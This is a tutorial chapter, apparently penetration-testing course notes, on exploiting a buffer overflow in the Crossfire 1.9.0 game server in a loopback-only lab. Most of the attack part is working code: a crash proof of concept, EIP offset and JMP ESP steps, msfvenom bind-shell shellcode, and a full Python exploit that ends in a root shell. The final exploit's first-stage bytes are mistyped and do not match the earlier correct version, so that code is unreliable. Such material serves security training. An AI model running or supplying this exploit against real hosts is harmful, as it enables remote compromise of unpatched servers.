# 8. ‐ Linux Buffer Overflow Exploitation

The concetps behind exploiting buffer overflows in Linux are similar to those on the Windows platform. This section explores the process of exploiting a Linux application, the online multiplayer RPG game, Crossfire.

Crossfire 1.9.0 suffered from a buffer overflow while accepting input from a socket connection. You'll use the Evans Linux debugger (EDB) to debug this program, as it will provuide you with a familiar debugging environment, which should ease you into exploiting buffer overflows in Linux environments.

## 8.1 - Setting Up the Environment

We will use our Kali Linux **i486** machine, to both run the vulnerable software, and debug the application.

However, before you run this vulnerable software on our machine, you should implement an **iptables** rule that will only allow traffixc from the loopback interface, so that your machine is **not** vulnerable to external attacks. For this same reason, we will be using the loopback interface (127.0.0.1) as our target IP and TCP port 4444 as our bind shell port.

This rule will deny any traffic to the vulnerable port, and prevent others from exploiting your Kali Linux machine during this exercise.

```
iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP
iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP
```

Now that we've secured our machine, we can proceed to download and install the vulnerable version of **crossfire** in Kali Linux:

##### Crossfire 1.9.0 downlaod [link](https://www.offensive-security.com/crossfire.tar.gz)

```
root@kali:~# cd /usr/games/
root@kali:~# wget https://www.offensive-security.com/crossfire.tar.gz
root@kali:~# tar zxpf crossfire.tar.gz
```

In more recnt Linux kernels and compilers, various memory protection tachniques have been implemented, such as memory randomization, stack coockies, etc. Bypassing these protection mechanims is beyond the scope of this modeule. The version of crossfire we are testing was compiled without the stack smashing protection support, as well as without ASRL and DEP support.

## 8.2 - Crashing Crossfire

We can start the vulnerable Crossfire application using the Evans debugger, using the following command:

```
root@kali:~# edb --run /usr/games/crossfire/bin/crossfire
```

The debbuger pauses the application at start, so we need to hit the **run** button twice, to allow the program to actually execute.

Once the crossfire application is running, we can use the following **Proof of Concept** (PoC) code, found on the Exploit Database to crash the application.

```python
#!/usr/bin/python

import socket

host = "127.0.0.1"
crash = "\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer"
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*] Payload Sent!"
```

Once we run this script, the debugger spits out the following error message, which clearly indicates a buffer overflow condition in the **setup sound** command:

![](https://preview.ibb.co/gKaWen/image.png)

We can see that the **EIP** register is overwritten with our user input of **A's**.

### 8.2.1 - Exercise

1. Create a PoC that crashes the Crossfire server.

> poc.py

## 8.3 - Controlling EIP

Following the same methodology we used in the SLMail overflow, our next task is to identify which four bbytes in our buffer end up overwritting EIP. We once again use the **pattern_create** script, to create a unique buffer string.

```
root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 4379
```

Swapping this new, unique, buffer with our original buffer, and sending the payload to the crossfire application, causes the debugger crash, this time with EIP overwritten with the following bytes.

![](https://image.ibb.co/ePvxKn/image.png)

Using this value, together with the **pattern_offset** script, shows the following buffer offset for those particular bytes:

```
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 46368046
[*] Exact math at offset 4368
```

We modify the exploit buffer in our Python script accordingly, to see if we have full control of the EIP register:

```python
crash = "\x41" * 4368 + "B" * 4 + "C" * 7
```

This new buffer works as expected. Our **4 B's** cleanly overwrite EIP.

![](https://image.ibb.co/hYFiQS/image.png)

## 8.4 - Finding Space for Our Shellcode

At the time of the crash, we once again check any registers that may help us easily reach our buffer. In this case, the EAX register seems to point to the beginning of our buffer, including the setup sound string.

![](https://preview.ibb.co/gFsPX7/image.png)

The fact that EAX does not point directly into our buffer may impact our ability to simply jump to EAX, as we would be executing the opcode equivalent of the string **"setup sound"** before our shellcode, which would most probably mangle the execution path, and cause our exploit to fail. Or would it?

Further examination of the actual opcodes produced by the setup string shows the following instructions, generated by the **"setup sound"** string:

![Disassembly of the ʺsetup  sound" String](https://image.ibb.co/iPX55S/image.png)

Interestingly, it seems that the opcode instructions **s** and **e** (the two first letters of the word "setup") translate to a "conditional jump" instruction, which seems to jump to a nearbt location in our user controlled buffer. The next two letters of the word setup, **t** and **u**, translate to a slightly differeent conditional jump. All these jumps seem to be leading into our user controlled buffer. A jump to EAX might actually work for us, in this case, with a bit of massaging. However, this is not an elegant solution. Let's try harder.

## 8.5 - Improving Exploit Reliability

Continuing our analysis, it looks like the ESP register points toward the end of our C buffer, at the time of the crash, giving us only a few bytes of shellcode space to work with. Unlike the previous SLMail buffer overflow, increasing the buffer length of the "setup sound" string casues the application to crash differently. However, all is not lost.

We can still use the few bytes pointed at by the ESP register, during the crash, to create a first stage shellcode, which will align the EAX register to the beginning of the buffer of **A's**, skipping over the string "setup sound".

To do this, our first stage shellcode would need to add 12 bytes to the EAX register, and then jump to EAX. Let's see what the opcode for this first stage shellcode would be.

```
root@kali:~# /usr/share/metasploit-framework/tools/nasm_shell.rb
nasm > add eax,12
00000000  83C00C			add eax,byte +0xc
nasm > jmp eax
00000000  FFE0				jmp eax
nams >
```

Fortunately for us, these two sets of instructions take up only 5 bytes of memory - **\x83\xc0\x0c\xff\xe0**.

## 8.6 - Discovering Bad Characters

The process of bad character discovery is very similar to the SLMail exercise. We will send the whole range of characters to our buffer and then monitor whether any of those characters get mangled, swapped, dropped, or changed, once they are in memory. The list of bad characters we discovered for the crossfire application is **\x00\x0a\x0d\x20**

### 8.6.1 - Exercises

1. update your PoC so you have control of the EIP register.

> ...

2. Identify what characters you cannot use as part of your payload.

> ...

## 8.7 - Finding a Return Address

Now that we know that we want to reach the buffer pointed to by the ESP register, we need to find an instruction, such as JMP ESP, which will take us to the address pointed to by the ESP register. Evans Debugger has an easy opcode search feature, which makes this task easy.

![](https://image.ibb.co/i9bqN7/image.png)

We choose the first JMP ESP instruction we come across, and modify our exploit buffer to include this return address.

```python
crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"
```

Before sending this buffer to crossfire, we place a breakpoint on our return address, "0x08134597", so that we can follow the execution flow, at the time of the crash. Once the payload is sent, our breakpoint is reached. The next instruction to be executed is a JMP ESP.

![](https://preview.ibb.co/jgUVpn/image.png)

Pressing **F8** will execute the JMP ESP instruction, which will lead us to the beginning of our first stage shellcode:

![](https://image.ibb.co/nNxph7/image.png)

Once the EAX register is aligned by our first stage shellcode, a JMP EAX instructions brings us into a nice, clean buffer of **A's**.

![](https://image.ibb.co/mXMMvS/image.png)

## 8.8 - Getting a Shell

All that's left to do now is frop our shellcode at the beggining of our buffer of **B's**, where it will be reached by our conditional jump.

```python
root@kali:~# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -b "\x00\x0a\x0d\x20" -f python
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 105 (iteration=0)
x86/shikata_ga_nai chosen with final size 105
Payload size: 105 bytes
Final size of python file: 520 bytes
buf =  ""
buf += "\xd9\xca\xbd\xde\xa6\xb4\xda\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x14\x83\xe8\xfc\x31\x68\x15\x03\x68\x15\x3c"
buf += "\x53\x85\x01\x37\x7f\xb5\xf6\xe4\xea\x38\x70\xeb\x5b"
buf += "\x5a\x4f\x6b\xc0\xfd\x1d\x03\xf5\x01\xb3\x8f\x93\x11"
buf += "\xe2\x7f\xed\xf3\x6e\x19\xb5\x3e\xee\x6c\x04\xc5\x5c"
buf += "\x6a\x37\xa3\x6f\xf2\x74\x9c\x16\x3f\xfa\x4f\x8f\xd5"
buf += "\xc4\x37\xfd\xa9\x72\xb1\x05\xc1\xab\x6e\x85\x79\xdc"
buf += "\x5f\x0b\x10\x72\x29\x28\xb2\xd9\xa0\x4e\x82\xd5\x7f"
buf += "\x10"
```

Here is our final exploit code for the crossfire vulnerability.

```
#!/usr/bin/python

import socket
host = "127.0.0.1"

shellcode = ("\xd9\xca\xbd\xde\xa6\xb4\xda\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x14\x83\xe8\xfc\x31\x68\x15\x03\x68\x15\x3c\x53\x85\x01\x37\x7f\xb5\xf6\xe4\xea\x38\x70\xeb\x5b\x5a\x4f\x6b\xc0\xfd\x1d\x03\xf5\x01\xb3\x8f\x93\x11\xe2\x7f\xed\xf3\x6e\x19\xb5\x3e\xee\x6c\x04\xc5\x5c\x6a\x37\xa3\x6f\xf2\x74\x9c\x16\x3f\xfa\x4f\x8f\xd5\xc4\x37\xfd\xa9\x72\xb1\x05\xc1\xab\x6e\x85\x79\xdc\x5f\x0b\x10\x72\x29\x28\xb2\xd9\xa0\x4e\x82\xd5\x7f\x10")

ret = "\x97\x45\x13\x08"

crash = shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\c0C\xFF\xE0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*] Payload Sent!"
```

Running the exploit should produce a bind shell on port 4444:

```
root@kali:~# python crossfire.py
[*] Sending evil buffer...
#version 1023 1027 Crossfire Server

[*] Payload Sent!
```

```
root@kali:~# nc -v 127.0.0.1 4444
localhost [127.0.0.1] 4444 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
```

### 8.8.1 - Exercise

1. Update your proof of concept and obtain a shell from Crossfire.